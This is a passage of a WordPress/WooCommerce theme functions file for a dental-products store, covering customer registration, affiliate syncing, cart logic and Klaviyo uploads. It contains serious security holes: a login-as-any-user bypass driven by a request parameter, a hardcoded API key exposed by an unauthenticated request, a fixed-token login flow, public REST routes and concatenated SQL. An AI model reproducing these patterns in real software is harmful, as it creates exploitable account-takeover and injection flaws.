     * if you don't want current user to be the new post author,
     * then change next couple of lines to this: $new_post_author = $post->post_author;
     */
        $current_user = wp_get_current_user();
        $new_post_author = $current_user->ID;

        /*
     * if post data exists, create the post duplicate
     */
        if (isset($post) && $post != null) {

            /*
       * new post data array
       */
            $args = array(
                'comment_status' => $post->comment_status,
                'ping_status'    => $post->ping_status,
                'post_author'    => $new_post_author,
                'post_content'   => $post->post_content,
                'post_excerpt'   => $post->post_excerpt,
                'post_name'      => $post->post_name,
                'post_parent'    => $post->post_parent,
                'post_password'  => $post->post_password,
                'post_status'    => 'draft',
                'post_title'     => $post->post_title,
                'post_type'      => $post->post_type,
                'to_ping'        => $post->to_ping,
                'menu_order'     => $post->menu_order
            );

            /*
       * insert the post by wp_insert_post() function
       */
            $new_post_id = wp_insert_post($args);

            /*
       * get all current post terms ad set them to the new post draft
       */
            $taxonomies = get_object_taxonomies($post->post_type); // returns array of taxonomy names for post type, ex array("category", "post_tag");
            foreach ($taxonomies as $taxonomy) {
                $post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
                wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
            }

            /*
       * duplicate all post meta just in two SQL queries
       */
            $post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
            if (count($post_meta_infos) != 0) {
                $sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
                foreach ($post_meta_infos as $meta_info) {
                    $meta_key = $meta_info->meta_key;
                    if ($meta_key == '_wp_old_slug') continue;
                    $meta_value = addslashes($meta_info->meta_value);
                    $sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
                }
                $sql_query .= implode(" UNION ALL ", $sql_query_sel);
                $wpdb->query($sql_query);
            }


            /*
       * finally, redirect to the edit post screen for the new draft
       */
            wp_redirect(admin_url('post.php?action=edit&post=' . $new_post_id));
            exit;
        } else {
            wp_die('Post creation failed, could not find original post: ' . $post_id);
        }
    }
    add_action('admin_action_rd_duplicate_post_as_draft', 'rd_duplicate_post_as_draft');

    /*
   * Add the duplicate link to action list for post_row_actions
   */
    function rd_duplicate_post_link($actions, $post)
    {
        if (current_user_can('edit_posts')) {
            $actions['duplicate'] = '<a href="' . wp_nonce_url('admin.php?action=rd_duplicate_post_as_draft&post=' . $post->ID, basename(__FILE__), 'duplicate_nonce') . '" title="Duplicate this item" rel="permalink">Duplicate</a>';
        }
        return $actions;
    }

    add_filter('page_row_actions', 'rd_duplicate_post_link', 10, 2);

    add_action('affwp_update_profile_settings', 'affwp_do_actions_recommended', 9);
    function affwp_do_actions_recommended()
    {

        if (isset($_POST['rdh_recommended_url'])) {
            update_user_meta(get_current_user_id(), 'rdh_recommended_url', $_POST['rdh_recommended_url']);
        }
    }
    function modify_coupopns_mbt()
    {
        if (isset($_GET['cop'])) {
            $args = array(
                'posts_per_page' => 20000,
                'post_type' => 'shop_coupon',
                'post_status' => 'publish',
            );

            $coupons = get_posts($args);

            $prefix = 'JEMWT3-'; // the prefix to search for

            $results = array();

            foreach ($coupons as $coupon) {
                if (substr($coupon->post_title, 0, strlen($prefix)) === $prefix) {
                    echo $coupon->post_title . '<br />';
                    update_post_meta($coupon->ID, 'limit_usage_to_x_items', '1');
                }
            }


            die();
        }
    }
    //add_action('wp_loaded','modify_coupopns_mbt');

    // Add item meta value to WooCommerce mini cart
    function display_item_meta_in_mini_cart($_productname, $cart_item, $cart_item_key)
    {
        $item_meta = isset($cart_item['mouth_guard_number']) ? $cart_item['mouth_guard_number'] : ''; // Replace '_your_meta_key' with your actual meta key

        if ($item_meta) {
            $_productname .= '<br />Number: ' . $item_meta;
        }
        $item_meta = isset($cart_item['mouth_guard_color']) ? $cart_item['mouth_guard_color'] : '';

        if ($item_meta) {
            $_productname .= ' Color: ' . $item_meta;
        }

        return $_productname;
    }
    
    add_filter('woocommerce_cart_item_name', 'display_item_meta_in_mini_cart', 8, 3);


    add_filter('rest_post_dispatch', 'wp_mbt_rest_post_dispatch_filter', 10, 3);

    /**
     * Function for `rest_post_dispatch` filter-hook.
     * 
     * @param WP_HTTP_Response $result  Result to send to the client. Usually a `WP_REST_Response`.
     * @param WP_REST_Server   $server  Server instance.
     * @param WP_REST_Request  $request Request used to generate the response.
     *
     * @return WP_HTTP_Response
     */
    function wp_mbt_rest_post_dispatch_filter($result, $server, $request)
    {

        // print_r($result);
        // die();
        // Decode the JSON result
        if (is_object($result)) {



            // Check if the decoding was successful
            if ($result !== null) {
                // Get the endpoint
                $endpoint = $request->get_route();

                // Get the parameters
                $parameters = $request->get_params();
                if ($endpoint == '/yoast/v1/get_head') {
                } else {
                    // if (is_array($result)) {
                    $add_flag = false;
                    if (isset($result->data['id']) && $result->data['id'] != '' && $endpoint == '/wc/v3/customers' && isset($parameters['threed_Scanner_result'])) {
                        //
                        $add_flag = true;
                        $impression_id = 'LS' . generate_unique_random_number();
                    } else if ($endpoint == '/wc/v3/customers' && isset($parameters['threed_Scanner_result']) && isset($parameters['tray_number']) && $parameters['tray_number'] != '') {
                        $impression_id = $parameters['tray_number'];
                        $add_flag = true;
                    } else if ($endpoint == '/wc/v3/customers' && isset($parameters['threed_Scanner_result']) && isset($parameters['tray_number']) && $parameters['tray_number'] == '') {
                        $impression_id = 'LS' . generate_unique_random_number();
                        $add_flag = true;
                    } else {
                        $add_flag = false;
                    }
                    if ($add_flag) {
                        if (isset($parameters['user_id']) && $parameters['user_id'] != '') {
                            $customer_id = $parameters['user_id'];
                        } else {
                            $customer_id = $result->data['id'];
                        }

                        $primary_sport = $parameters['primary_sport'];
                        $interested_products = $parameters['interested_products'];
                        update_user_meta($customer_id, '_dob', $parameters['dob']);
                        update_user_meta($customer_id, '_gender', $parameters['gender']);
                        add_3d_scanner_customer_details($customer_id, $impression_id, $primary_sport);
                        add_interested_products($impression_id, $interested_products);
                        $scan_id = get_customer_3d_scan_id($customer_id);
                        $response = send_twilio_text_sms($parameters['billing']['phone'], $parameters['first_name'] . ', we have confirmed your account registration with Smile Brilliant / ProShield! Your registration ID is ' . $scan_id . '. Please present this ID to your agent before they begin your scan. Login details have been emailed to your email address at ' . $parameters["email"] . '.');
                        $result->data['scan_id'] = $scan_id;
                        $result->data['data']['status'] = 200;
                        $result->data['status'] = 200;
                    }
                    // }
                }
            }
        }
        return $result;
    }
    function add_3d_scanner_customer_details($customer_id, $impression_id, $primary_sport)
    {


        // Save extra information to custom table
        global $wpdb;
        $table_name = '3d_scan_customers';

        $extra_info = array(
            'customer_id' => $customer_id,
            '3d_scan_id' => $impression_id,
            'primary_sport' => $primary_sport,

        );

        $wpdb->insert($table_name, $extra_info);
        $wpdb->print_error();
    }

    function add_interested_products($impression_id, $sports)
    {
        global $wpdb;
        $table_name = 'customer_interested_products';
        if (is_array($sports) && count($sports) > 0) {
            foreach ($sports as $sp) {
                $extra_info = array(
                    'product_name' => $sp,
                    '3d_scan_id' => $impression_id
                );

                $wpdb->insert($table_name, $extra_info);
                $wpdb->print_error();
            }
        }
    }
    function get_customer_3d_scan_id($customer_id)
    {
        global $wpdb;

        // Table name
        $table_name = '3d_scan_customers';

        // Prepare the SQL query
        $query = $wpdb->prepare(
            "SELECT 3d_scan_id FROM $table_name WHERE customer_id = %d",
            $customer_id
        );

        // Execute the query
        return $impression_value = $wpdb->get_var($query);
    }
    add_action('init', 'signonuserProgramatically');
    function signonuserProgramatically()
    {
        if (isset($_REQUEST['newusersignid']) && $_REQUEST['newusersignid'] != '') {
            $user_id = $_REQUEST['newusersignid'];
            $decodedID = base64_decode($user_id);

            wp_clear_auth_cookie();
            wp_set_current_user((int) $decodedID);
            wp_set_auth_cookie((int) $decodedID);

            $redirect_to = home_url() . '/my-account';
            wp_safe_redirect($redirect_to);
            exit();
        }
    }

    function generate_unique_random_number()
    {
        $min_number = 100000;
        $max_number = 999999;

        // Retrieve the existing numbers from the transient
        $existing_numbers = get_transient('unique_random_numbers');

        if (!$existing_numbers) {
            // If the transient doesn't exist, create an empty array
            $existing_numbers = array();
        }

        // Generate a unique random number
        $number = mt_rand($min_number, $max_number);

        while (in_array($number, $existing_numbers)) {
            $number = mt_rand($min_number, $max_number);
        }

        // Store the generated number in the array
        $existing_numbers[] = $number;

        // Limit the array size to keep only the last 10 generated numbers (adjust as needed)
        $existing_numbers = array_slice($existing_numbers, -10, 10);

        // Update the transient with the new array of numbers, set to expire in 24 hours (adjust as needed)
        set_transient('unique_random_numbers', $existing_numbers, 24 * HOUR_IN_SECONDS);

        return $number;
    }



    if (isset($_REQUEST['getallupsell'])) {
        add_action('init', 'getUpsellProducts');
    }

    function getUpsellProducts()
    {
        $comp_data = array();
        $show_popProduct = array();
        $pop_products = array();
        $related_products = array();
        $related_product_data = array();
        if (have_rows('upsell_combination', 'option')) :
            while (have_rows('upsell_combination', 'option')) : the_row();
                $visibilty =  get_sub_field('visibilty');
                if (in_array($visibilty, array('cart', 'both'))) {
                    $upsell_product =  get_sub_field('upsell_product');
                    if ($upsell_product) {
                        $offer_text =  get_sub_field('offer_text');
                        $descripton_text =  get_sub_field('descripton_text');
                        $product_feature_image_url = get_field("pic_5", $upsell_product);

                        if (have_rows('related_products')) :
                            while (have_rows('related_products')) : the_row();
                                $related_products[$upsell_product][] = get_sub_field('product_id');
                                $show_popProduct[] =  get_sub_field('product_id');
                            endwhile;
                        endif;
                        $related_product_data[$upsell_product] = array(
                            'title_show' => $descripton_text,
                            'offer_text' => $offer_text,
                            'product_feature_image_url' => $product_feature_image_url
                        );
                        $pop_products[] = $upsell_product;
                        $show_pop = array_unique($show_popProduct);
                    }
                }
            endwhile;
        endif;


        $comp_data['related_products'] = $related_products;
        $comp_data['related_product_data'] = $related_product_data;
        return json_encode($comp_data);
    }
    function generate_and_store_api_key()
    {
        if (isset($_REQUEST['add_api_key'])) {
            // Generate a random API key (you can use a more secure method)
            $api_key = bin2hex(random_bytes(16));
            $api_key = '69b002675a30e9ef5565aae416a3102c';
            // Store the API key as an option in the WordPress database
            update_option('rdh_api_key', $api_key);
            echo $api_key;
            die();
        }
    }
    add_action('init', 'generate_and_store_api_key');
    function custom_get_upsell_products($request)
    {
        // Call your getUpsellProducts function here
        $upsell_products = getUpsellProducts();

        return rest_ensure_response($upsell_products);
    }

    function register_rdh_affiliate($request)
    {
        // Retrieve the stored API key
        $stored_api_key = get_option('rdh_api_key');

        // Check if the API key matches the one provided in the request
        $api_key = $request->get_header('Authorization');
        $api_key = substr($api_key, 7);

        if ($api_key === $stored_api_key) {
            $data = json_decode($request->get_body(), true);
            $user_id = email_exists($data['email']);
            if ($user_id) {
                $affiliate_id = affwp_get_affiliate_id($user_id);
                update_user_meta($user_id, 'rdh_user_id_rdhconnect', $data['rdh_user_id']);
                cloneRdhPageById($user_id);
                if ($affiliate_id) {
                    $response = array('message' => 'User registered on the second site successfully.', 'affiliat_user_id_sbr' => $affiliate_id, 'sbr_user_id' => $user_id);
                } else {
                    cloneRdhPageById($user_id);
                    $affiliate_id = affwp_add_affiliate(array(
                        'user_id'        => $user_id,
                        'status' => 'active',
                        'dynamic_coupon' => !affiliate_wp()->settings->get('require_approval') ? 1 : '',
                    ));
                    affwp_update_affiliate(array('affiliate_id' => $affiliate_id, 'rate' => '20', 'rate_type' => 'percentage'));

                    $emails = WC()->mailer()->get_emails();
                    $respose =   $emails['WC_RDH_Register_Email']->trigger($user_id);

                    $status = affwp_get_affiliate_status($affiliate_id);
                    $user   = (array) get_userdata($user_id);
                    $args   = (array) $user['data'];
                    do_action('affwp_auto_register_user', $affiliate_id, $status, $args);
                    $response = array('message' => 'User registered on the second site successfully.', 'affiliat_user_id_sbr' => $affiliate_id, 'sbr_user_id' => $user_id);
                }
                return rest_ensure_response($response);
            }
            $user_id = wp_create_user($data['username'], $data['password'], $data['email']);
            if (is_wp_error($user_id)) {
                return new WP_Error('registration_failed', 'User registration on the second site failed.', array('status' => 400));
            }
            $affiliate_id = affwp_add_affiliate(array(
                'user_id'        => $user_id,
                'status' => 'active',
                'dynamic_coupon' => !affiliate_wp()->settings->get('require_approval') ? 1 : '',
            ));
            affwp_update_affiliate(array('affiliate_id' => $affiliate_id, 'rate' => '20', 'rate_type' => 'percentage'));
            update_user_meta($user_id, 'rdh_user_id_rdhconnect', $data['rdh_user_id']);
            cloneRdhPageById($user_id);


            $status = affwp_get_affiliate_status($affiliate_id);
            $user   = (array) get_userdata($user_id);
            $args   = (array) $user['data'];
            do_action('affwp_auto_register_user', $affiliate_id, $status, $args);
            $response = array('message' => 'User registered on the second site successfully.', 'affiliat_user_id_sbr' => $affiliate_id, 'sbr_user_id' => $user_id);
            update_user_meta($user_id, 'rdh_user_id_rdhconnect_mbt', $data['rdh_user_id']);
            // $respose =   $emails['WC_RDH_Register_Email']->trigger($user_id);
        } else {
            $response = array('message' => 'Authentication failed.');
        }

        return rest_ensure_response($response);
    }
    add_action('rest_api_init', function () {
        register_rest_route('custom/v1', '/get-upsell-products', array(
            'methods' => 'GET',
            'callback' => 'custom_get_upsell_products',
            'permission_callback' => '__return_true', // Public access
        ));
        register_rest_route('custom/v1', '/login_user_by_email', array(
            'methods' => 'GET',
            'callback' => 'handle_request_callback_login',
            'permission_callback' => '__return_true', 
        ));
        register_rest_route('custom/v1', '/register_rdh_affiliate', array(
            'methods' => 'GET',
            'callback' => 'register_rdh_affiliate',
            'permission_callback' => '__return_true', 
        ));
        register_rest_route('custom/v1', '/get-user-sbr-articles', array(
            'methods' => 'POST',
            'callback' => 'sbr_articles_callback_func_call',
            'permission_callback' => '__return_true', 
        ));
        register_rest_route('custom/v1', '/get-sbr-articles', array(
            'methods' => 'GET',
            'callback' => 'sbr_all_articles_callback_func_call',
            'permission_callback' => '__return_true', 
        ));
        register_rest_route('custom/v1', '/get-recom-page_content', array(
            'methods' => 'GET',
            'callback' => 'get_recom_page_content_func_call',
            'permission_callback' => '__return_true', 
        ));
        register_rest_route('custom/v1', '/get-rdh-articles', array(
            'methods' => 'GET',
            'callback' => 'custom_get_upsell_products',
            'permission_callback' => '__return_true', 
        ));
    });

    function get_recom_page_content_func_call($request)
    {
        // print_r($request);
        $parms = $request->get_params();

        $userid = (int) $parms['user_id'];

        $stored_api_key = get_option('rdh_api_key');

        // Check if the API key matches the one provided in the request
        $api_key = $request->get_header('Authorization');
        $api_key = substr($api_key, 7);

        if ($api_key === $stored_api_key) {
            global $wpdb;
            $get_redhc_page = "SELECT post_id FROM wp_postmeta INNER JOIN wp_posts ON wp_posts.ID =  wp_postmeta.post_id WHERE meta_key='rdhc_id' AND meta_value = $userid AND post_type='page' and post_status = 'publish'";
            $page_id = $wpdb->get_var($wpdb->prepare($get_redhc_page));
            if ($page_id != '') {

                $page = get_post($page_id);
                $content = apply_filters('the_content', $page->post_content);
                $content = do_shortcode($content);
                $response = array('page_content' => $content);
            }
        } else {
            $response = array('message' => 'Authentication failed.');
        }

        // print_r($response);
        // die();
        return $response;
    }
    function sbr_articles_callback_func_call($request)
    {
        // print_r($request);
        $parms = $request->get_params();

        $userid = (int) $parms['user_id'];

        $stored_api_key = get_option('rdh_api_key');

        // Check if the API key matches the one provided in the request
        $api_key = $request->get_header('Authorization');
        $api_key = substr($api_key, 7);

        if ($api_key === $stored_api_key) {
            $response = sbr_articles_callback($type = 'listing', $cat = 0, $user_id = $userid);
        } else {
            $response = array('message' => 'Authentication failed.');
        }
        return $response;
        // Do something with the dynamic parameter

    }
    function sbr_all_articles_callback_func_call($request)
    {
        //  print_r($request);
        $parms = $request->get_params();
        // print_r($parms);
        // die();
        $perpage = (int) $parms['perpage'];

        $stored_api_key = get_option('rdh_api_key');

        // Check if the API key matches the one provided in the request
        $api_key = $request->get_header('Authorization');
        $api_key = substr($api_key, 7);

        if ($api_key === $stored_api_key) {
            $args = array(
                'post_type' => 'post',
                //  'posts_per_page' => $perpage,
                'post__in' => $parms['post_ids'],
                'post_status' => 'publish',
                'orderby' => 'date',
                'order' => 'ASC',
            );
            if (isset($parms['post_ids'])) {
                $args['post__in'] = $parms['post_ids'];
            }
            //  print_r($args);
            $query = new WP_Query($args);
            $posts = $query->posts;

            $results = array();
            foreach ($posts as $post) {
                $thumbnail_id = get_post_thumbnail_id($post);
                $thumbnail = wp_get_attachment_image_src($thumbnail_id, 'full');
                $results[] = array(
                    'title' => $post->post_title,
                    'link' => get_permalink($post),
                    'image' => $thumbnail[0],
                );
            }
            $response = $results;
        } else {
            $response = array('message' => 'Authentication failed.');
        }
        return $response;
        // Do something with the dynamic parameter

    }
   
    
    function handle_request_callback_login( $request) {
        
        $useremail = urldecode(isset($_REQUEST['useremail']) ? $_REQUEST['useremail']:'');
        $token_sbr = isset($_REQUEST['token_sbr']) ? $_REQUEST['token_sbr']:'';
    
        if ($useremail && $token_sbr === 'SBR_RDH_VALID') {
            $current_user = get_user_by('email', $useremail);
    
            if ($current_user && !is_super_admin($current_user->ID) && !in_array('author', $current_user->roles) && !in_array('editor', $current_user->roles)) {
                set_transient('rdh_user_id', $current_user->ID, 5);
                return new WP_REST_Response(array('user_id' => $current_user->ID), 200);
            }
        }
    
        return new WP_REST_Response('Invalid request', 400);
    }
    //add_action('init', 'wp_signon_rdh_on_sbr');
    function wp_signon_rdh_on_sbr()
    {

        if (isset($_REQUEST['useremail']) && $_REQUEST['useremail'] != '' && isset($_REQUEST['token_sbr']) && $_REQUEST['token_sbr'] == 'SBR_RDH_VALID') {

            $current_user = get_user_by('email', $_REQUEST['useremail']);

            if (
                $current_user &&  !is_super_admin($current_user->ID) &&
                !in_array('author', $current_user->roles) &&
                !in_array('editor', $current_user->roles)
            ) {

                set_transient('rdh_user_id', $current_user->ID, 5);
                print_r($current_user->ID);
                // die($current_user->ID);
                die();
            }
        }
    }
    add_action('wp_loaded', 'wp_signon_rdh_on_sbr_cookie');
    function wp_signon_rdh_on_sbr_cookie()
    {

        if (isset($_REQUEST['useremail']) && $_REQUEST['useremail'] != '' && isset($_REQUEST['userid']) && $_REQUEST['userid'] != '') {

            $current_user = get_user_by('email', $_REQUEST['useremail']);

            if (
                $current_user &&  !is_super_admin($current_user->ID) &&
                !in_array('author', $current_user->roles) &&
                !in_array('editor', $current_user->roles)
            ) {
                if (get_transient('rdh_user_id') == $_REQUEST['userid']) {
                    $user_id = (int) $_REQUEST['userid'];
                    wp_clear_auth_cookie();
                    wp_set_current_user($user_id); // Set the current user detail
                    wp_set_auth_cookie($user_id);
                }
            }
        }
    }
    add_action('rest_api_init', function () {
        register_rest_route('woocommerce-add-to-cart/v1', 'add_to_cart', array(
            'methods' => 'POST',
            'callback' => 'myplugin_add_to_cart',
            'permission_callback' => '__return_true', // Public access
        ));
    });

    function myplugin_add_to_cart(WP_REST_Request $request)
    {
        $product_id = $request['product_id'];
        $quantity = $request['quantity'];

        $cart_item_key = WC()->cart->add_to_cart($product_id, $quantity);

        if ($cart_item_key) {
            return WC()->cart;
        } else {
            return new WP_Error('cant-add', 'Cannot add product to cart.', array('status' => 500));
        }
    }

    function my_hide_notices_to_all_but_super_admin_mbt()
    {
        $screen = get_current_screen();

        // Check if it's main dashboard page
        if ($screen && ($screen->id === 'dashboard')) {
            //
        } else {
            remove_all_actions('user_admin_notices');
            remove_all_actions('admin_notices');
        }
    }
    add_action('in_admin_header', 'my_hide_notices_to_all_but_super_admin_mbt', 99);

    add_action('rest_api_init', function () {
        register_rest_field(
            'page',
            'content',
            array(
                'get_callback'    => 'htr_do_shortcodes',
                'update_callback' => null,
                'schema'          => null,
            )
        );
    });
    function htr_do_shortcodes($object, $field_name, $request)
    {
        WPBMap::addAllMappedShortcodes();
        global $post;
        $post = get_post($object['id']);
        $output['rendered'] = apply_filters('the_content', $post->post_content);
        return $output;
    }

    /*
Shipping Protection
*/
    function manipulate_cart_items_before_calculate_totals()
    {
        // Check if the product with ID 123 is not in the cart, then add it
        $product_id_to_add = SHIPPING_PROTECTION_PRODUCT;
        $found = false;
        global $shipping_protect_exist;
        global $removeCookieShippingProtection;
        if (!isset($_COOKIE['shipping_protection'])) {
            // Set the 'shipping_protection' cookie
            $cookie_value = '1'; // Replace with the desired value
            setcookie('shipping_protection', $cookie_value, time() + 7 * 24 * 3600, '/'); // Adjust expiration time as needed

        }
        $cart_items =WC()->cart->get_cart();
        foreach ($cart_items as $cart_item_key => $cart_item) {
            if ($cart_item['product_id'] == $product_id_to_add) {
                $found = true;
                break;
            }
        }

        if (!$found) {
            if (isset($_COOKIE['shipping_protection']) && $_COOKIE['shipping_protection'] == '1') {
                if($shipping_protect_exist!='no'){
                    WC()->cart->add_to_cart($product_id_to_add);
                }
            }
        }

        // Check if the product with ID 456 is in the cart, then remove it
        $product_id_to_remove = SHIPPING_PROTECTION_PRODUCT;

        foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
            if ($cart_item['product_id'] == $product_id_to_remove) {
                $verifyShinePackage=false;
                //if (is_checkout() && !is_wc_endpoint_url()) {
                    $verifyShinePackage = is_only_shine_package_products_in_cart($cart_items);
              //  }
                if (!isset($_COOKIE['shipping_protection']) || $_COOKIE['shipping_protection'] == '0' || $verifyShinePackage) {
                    WC()->cart->remove_cart_item($cart_item_key);
                    break;
                }
            }
        }
    }

    add_action('woocommerce_before_calculate_totals', 'manipulate_cart_items_before_calculate_totals');
    function on_remove_product_546_delete_cookie($cart_item_key, $cart)
    {
        global $shipping_protect_exist;
        global $removeCookieShippingProtection;
        $product_id_to_remove = SHIPPING_PROTECTION_PRODUCT;

        // Check if the removed product has ID 546
        if (isset($cart->cart_contents[$cart_item_key]['product_id']) && $cart->cart_contents[$cart_item_key]['product_id'] == $product_id_to_remove && $removeCookieShippingProtection) {
            $shipping_protect_exist='no';
            // Delete the cookie
            $cookie_value = '0'; // Replace with the desired value
            setcookie('shipping_protection', $cookie_value, time() + 1800, '/'); // Set the expiration time to the past


        }
    }
    add_action('woocommerce_remove_cart_item', 'on_remove_product_546_delete_cookie', 10, 2);
    function order_contains_product( $orderItems, $product_id ) {
        // Get an instance of the WC_Order object
       
    
        // Iterate through each order item
        foreach ( $orderItems as $item_id => $item ) {
            // Get the product ID of the current order item
            $item_product_id = $item->get_product_id();
    
            // Check if the current order item matches the product ID
            if ( in_array($item_product_id,$product_id)) {
                // Product found in the order
                return true;
            }
        }
    
        // Product not found in the order
        return false;
    }
    /* get orders for same customer */
    function get_orders_matching_by_customer($order_id){
        $order = wc_get_order( $order_id );
        $customer_id = $order->get_user_id();
            $matchingOrders = get_posts(array(
                'numberposts' => -1,
                //'fields'        => 'ids',
                'post_type' => 'shop_order',
                'post_status' => array('wc-processing', 'wc-partial_ship', 'wc-on-hold'),
                'order' => 'ASC',
                'exclude' => array($order_id),
                'meta_query' => array(
                    'relation' => 'AND',
                    array(
                        'key' => '_customer_user',
                        'compare' => '=',
                        'value' => $customer_id, #<-- just some value as a pre 3.9 bugfix (Codex)
                    ),
                ),
            ));
            $dublicate_found = false;
            if ($matchingOrders) {
                $order_statuses = array(
                    'wc-pending' => _x('Pending payment', 'Order status', 'woocommerce'),
                    'wc-processing' => _x('Processing', 'Order status', 'woocommerce'),
                    'wc-on-hold' => _x('On hold', 'Order status', 'woocommerce'),
                    'wc-partial_ship' => _x('Partial Ship', 'Order status', 'woocommerce'),
                );
                $dublicate_found = false;
                $total_duplications = 0;
                foreach ($matchingOrders as $m_order) {
                    $s_order_id = $m_order->ID;
                    if ($order->get_id() == $s_order_id) {
                        continue;
                    }
                    $total_duplications++;
                    $m_order_post_status =$m_order->post_status;
                   // $m_order_post_status =$m_order->post_status;
                    $orderSBRref = get_post_meta($s_order_id, 'order_number', true);
                    $order_status = $order_statuses[$m_order->post_status];
                   
                }
                // echo $order_id.'=>'.$total_duplications;
                // echo '<br />';
                if($total_duplications>0){
                    $dublicate_found=true;
                }
            }
            return $dublicate_found;
    }
/*
manage inventory on order satus completed for local pickup orders
*/

    function deduct_inventory_on_order_completion($order_id) {
        // Get the order object
        $order = wc_get_order($order_id);
    
        // Loop through order shipping methods to check if it is "Pickup"
        foreach ($order->get_shipping_methods() as $shipping_item_id => $shipping_item) {
           
            if ($shipping_item->get_name() === 'Pickup') {
                // Loop through each item in the order
                foreach ($order->get_items() as $item_id => $item) {
                    // Get the product ID
                    $product_id = $item->get_product_id();
                    $compositeData = get_field('composite_products', $product_id);
                    $product = wc_get_product($product_id);
                  
                    // Get the quantity of the item
                    $quantity = $item->get_quantity();
                    $stockManagement = wc_get_order_item_meta($item_id, '_sbr_stock', true);
                    // Check if the product manages stock
                    foreach ($compositeData as $composite_item_id => $composite_item) {

                        $quantity_ordered = 0;
                        $firstShipment = $composite_item['first_shipment_qty'];
                        $secondShipment = $composite_item['second_shipment_qty'];
                        $composite_item_product_id = $composite_item['product_id'];
                        if ($firstShipment) {
                            $quantity_ordered = $quantity_ordered + $firstShipment;
                        }
    
                        if ($secondShipment) {
                            $quantity_ordered = $quantity_ordered + $secondShipment;
                        }
                        $quantity_shipped = 0;
                        if ($shipment == 2) {
                            $quantity_shipped = $secondShipment;
                        } else {
                            $quantity_shipped = $firstShipment;
                        }
                        if ($stockManagement == 'first') {
                            if (isset($order_notes[$composite_item_product_id])) {
                                $order_notes[$composite_item_product_id] = $secondShipment +   $order_notes[$composite_item_product_id];
                            } else {
                                $order_notes[$composite_item_product_id] = $secondShipment;
                            }
                        } else if ($stockManagement == 'second') {
                            //ALL Stock Updated
                        } else {
    
                            if (isset($order_notes[$composite_item_product_id])) {
                                $order_notes[$composite_item_product_id] = ($firstShipment*$quantity) +   $order_notes[$composite_item_product_id];
                            } else {
                                $order_notes[$composite_item_product_id] = $firstShipment*$quantity;
                            }
                        }
    
                        if ($shipment == 2) {
                            $childCompositeData[] = array(
                                'product_id' => $composite_item_product_id,
                                'quantity_ordered' => $quantity_ordered,
                                'quantity_shipped' => $quantity_shipped
                            );
                        }
                    }
                    if (!empty($order_notes)) {
                        // print_r($order_notes);
                        // die();
                        $logs = array();
                        foreach ($order_notes as $item_product_id => $child_qty) {
                            if ($child_qty) {
                                $productObj = wc_get_product($item_product_id);
                                wc_update_product_stock($item_product_id, $child_qty, 'decrease', false);
                                $logs[$item_product_id] = $productObj->get_formatted_name() . ' &rarr; ' . $child_qty;
                            }
                        }
                        $order->add_order_note(sprintf(__('Stock decrease:<br/> %s', 'woocommerce'), implode('<br/>', $logs)));
                    }
                }
            }
        }
    }
    add_action('woocommerce_order_status_completed', 'deduct_inventory_on_order_completion', 10, 1);
/*
Add to klaviyo list According to latest api
*/
function isJson($string) {
    // Try to decode the string
    json_decode($string);
    // Check if there was an error during decoding
    return (json_last_error() === JSON_ERROR_NONE);
}
function addProfileToKlaviyoList($api_key, $list_id, $email, $phone_number = null) {
    // echo 'called';
    
     
if (isJson($email)) {
 $email_encoded = json_decode($email,true);
 $profileData = array(
     'data' => array(
         'type' => 'profile',
         'attributes' => array(
            // 'email' => $email_encoded['email'],
           //  'phone_number' => '+15005550006',
             'first_name' => $email_encoded['profiles']['first_name'],
             'last_name' => $email_encoded['profiles']['last_name'],
            // 'organization' => 'Example Corporation',
           //  'title' => 'Regional Manager',
            // 'image' => 'https://images.pexels.com/photos/3760854/pexels-photo-3760854.jpeg',
            
             'properties' => array(
                 'source' => $email_encoded['profiles']['source'],
                 'Products of Interest'=>$email_encoded['profiles']['Products of Interest'],
             )
         )
     )
 );
 if(isset($email_encoded['profiles']['share_url'])){
     $profileData['data']['attributes']['properties']['share-url']=$email_encoded['profiles']['share_url'];
 }
 if(isset($email_encoded['profiles']['Dentist-client'])){
     $profileData['data']['attributes']['properties']['Dentist-client']=$email_encoded['profiles']['Dentist-client'];
 }
 if(isset($email_encoded['profiles']['Dentist-office'])){
     $profileData['data']['attributes']['properties']['Dentist-office']=$email_encoded['profiles']['Dentist-office'];
 }
 if(isset($email_encoded['email'])){
     $profileData['data']['attributes']['email']=$email_encoded['email'];
 }
} else {
 $profileData = array(
     'data' => array(
         'type' => 'profile',
         'attributes' => array(
            // 'email' => $email_encoded['email'],
           //  'phone_number' => '+15005550006',
             'email' => $email
            // 'organization' => 'Example Corporation',
           //  'title' => 'Regional Manager',
            // 'image' => 'https://images.pexels.com/photos/3760854/pexels-photo-3760854.jpeg',
            
             
         )
     )
 );
}

 // if(isset($email_encoded['email'])){
 //     $profileData['data']['attributes']['email']=$email_encoded['email'];
 // }
 $curl = curl_init();
 
 curl_setopt_array($curl, array(
     CURLOPT_URL => 'https://a.klaviyo.com/api/profiles/',
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_ENCODING => '',
     CURLOPT_MAXREDIRS => 10,
     CURLOPT_TIMEOUT => 0,
     CURLOPT_FOLLOWLOCATION => true,
     CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
     CURLOPT_CUSTOMREQUEST => 'POST',
     CURLOPT_POSTFIELDS => json_encode($profileData),
     CURLOPT_HTTPHEADER => array(
         'Authorization: Klaviyo-API-Key ' . $api_key,
         'accept: application/json',
         'content-type: application/json',
         'revision: 2024-05-15'
     ),
 ));
 
 $response = curl_exec($curl);
 
 curl_close($curl);
 $responseData = json_decode($response, true);

if (isset($responseData['data']['id'])) {
 $id = $responseData['data']['id'];

 $profileData_list = array(
     "data" => array(
         array(
             "type" => "profile",
             "id" => $id
         )
     )
 );
 //$id = $responseData['data']['id'];
 $curl = curl_init();
 
 curl_setopt_array($curl, array(
     CURLOPT_URL => 'https://a.klaviyo.com/api/lists/'.$list_id.'/relationships/profiles/',
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_ENCODING => '',
     CURLOPT_MAXREDIRS => 10,
     CURLOPT_TIMEOUT => 0,
     CURLOPT_FOLLOWLOCATION => true,
     CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
